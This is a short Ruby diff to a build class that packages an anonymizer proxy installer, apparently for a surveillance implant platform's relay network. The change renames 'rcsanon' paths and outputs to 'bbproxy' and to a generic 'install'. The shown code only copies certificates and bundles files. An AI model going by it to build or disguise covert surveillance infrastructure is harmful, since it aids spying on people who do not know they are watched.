@@ -22,9 +22,9 @@ class BuildAnon < Build
     trace :debug, "Build: melt #{params}"
 
     # take the files needed for the communication with RNC
-    Dir.mkdir path('rcsanon/etc')
-    FileUtils.cp Config.instance.cert('rcs-network.pem'), path('rcsanon/etc/certificate')
-    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('rcsanon/etc/signature')
+    Dir.mkdir path('bbproxy/etc')
+    FileUtils.cp Config.instance.cert('rcs-network.pem'), path('bbproxy/etc/certificate')
+    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('bbproxy/etc/signature')
 
     # the local port to listen on
     File.open(path('managerport'), 'wb') {|f| f.write params['port']}
@@ -34,22 +34,22 @@ class BuildAnon < Build
       gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
       output = Minitar::Output.new(gz)
 
-      h = {name: path('rcsanon/etc/certificate'), as: 'rcsanon/etc/certificate'}
+      h = {name: path('bbproxy/etc/certificate'), as: 'bbproxy/etc/certificate'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('rcsanon/etc/signature'), as: 'rcsanon/etc/signature'}
+      h = {name: path('bbproxy/etc/signature'), as: 'bbproxy/etc/signature'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('rcsanon/rcsanon'), as: 'rcsanon/rcsanon', mode: 0755}
+      h = {name: path('bbproxy/bbproxy'), as: 'bbproxy/bbproxy', mode: 0755}
       Minitar::pack_file(h, output)
 
-      h = {name: path('version'), as: 'rcsanon/etc/version'}
+      h = {name: path('version'), as: 'bbproxy/etc/version'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('managerport'), as: 'rcsanon/etc/managerport'}
+      h = {name: path('managerport'), as: 'bbproxy/etc/managerport'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('rcsanon/init.d/rcsanon'), as: 'rcsanon/init.d/rcsanon', mode: 0755}
+      h = {name: path('bbproxy/init.d/bbproxy'), as: 'bbproxy/init.d/bbproxy', mode: 0755}
       Minitar::pack_file(h, output)
 
     ensure
@@ -60,12 +60,12 @@ class BuildAnon < Build
     sh = File.open(path('install.sh'), 'rb+') {|f| f.read}
     bin = File.open(path('install.tar.gz'), 'rb+') {|f| f.read}
 
-    File.open(path('rcsanon-install'), 'wb') do |f|
+    File.open(path('install'), 'wb') do |f|
       f.write sh
       f.write bin
     end
 
-    @outputs = ['rcsanon-install']
+    @outputs = ['install']
   end
 
   def pack(params)
